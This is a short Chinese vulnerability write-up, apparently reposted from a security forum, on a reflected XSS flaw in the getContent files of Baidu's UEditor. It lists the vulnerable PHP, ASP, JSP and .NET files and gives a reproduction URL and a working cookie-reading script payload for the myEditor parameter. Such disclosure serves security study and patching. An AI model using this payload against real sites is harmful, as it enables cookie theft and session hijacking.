# 百度ueditor编辑器 xss漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3209](https://www.zhihuifly.com/t/topic/3209)

# 百度ueditor编辑器 xss漏洞

## 一、漏洞简介

产品官网下载地址：

https://ueditor.baidu.com/website/download.html#mini

涉及版本：php , asp, jsp, net

## 二、漏洞影响

## 三、复现过程

### 漏洞分析

存在漏洞的文件：

```
/php/getContent.php
/asp/getContent.asp
/jsp/getContent.jsp
/net/getContent.ashx 
```

#### /php/getContent.php

![image](img/d3136b3093200384d0ff9917429ad238.png)

入进行了过滤，但是在14行输出时却使用了htmlspecialchars_decode，造成XSS漏洞。

#### /asp/getContent.asp

![image](img/a8a4843374534bd13013bba459c1cc23.png)

获取myEditor参数无过滤，直接输出。

#### /jsp/getContent.jsp

![image](img/609d41f6835a2d5e57f1ea09e560a447.png)

获取myEditor参数无过滤，直接输出。

#### /net/getContent.ashx

![image](img/45161efa7ba74993bc7b1ceb3056b621.png)

获取myEditor参数无过滤，直接输出。

### 漏洞复现

php版本测试，其他版本一样。

![image](img/bc6d75bcc3472d05fb22b4fed9dce934.png)

url:

```
http://0-sec.org/php/getcontent.php 
```

payload:

```
myEditor=<script>alert(document.cookie)</script>
// myEditor中的’ E ’必须大写，小写无效。 
```

由于只是个反弹XSS，单独这个漏洞影响小。若能结合使用该编辑器的网站的其他漏洞使用，则可能产生不错的效果。

## 四、参考链接

> https://blog.csdn.net/yun2diao/article/details/91381846